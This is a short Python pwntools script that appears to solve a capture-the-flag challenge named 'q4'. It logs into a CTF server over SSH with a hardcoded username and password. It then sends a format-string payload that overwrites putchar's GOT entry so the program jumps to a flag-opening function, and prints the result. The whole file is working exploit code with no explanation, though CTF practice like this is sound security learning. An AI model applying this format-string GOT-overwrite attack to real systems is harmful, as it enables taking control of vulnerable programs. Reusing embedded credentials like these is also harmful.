#!/usr/bin/python
# -*- Coding: utf-8 -*-

from pwn import *

open_flag = 0x8048691
putchar_got = 0x80499e0

def main():
    s = ssh(host='ctfq.sweetduet.info', port=10022, user='q4', password='q60SIMpLlej9eq49')

    writes = {putchar_got: open_flag}
    payload = fmtstr_payload(6, writes, numbwritten=0)
    
    target = s.process(["./q4"])
    target.readline()
    target.sendline(payload)
    target.readline()
    print(target.readline())

    
if __name__ == "__main__":
    main()
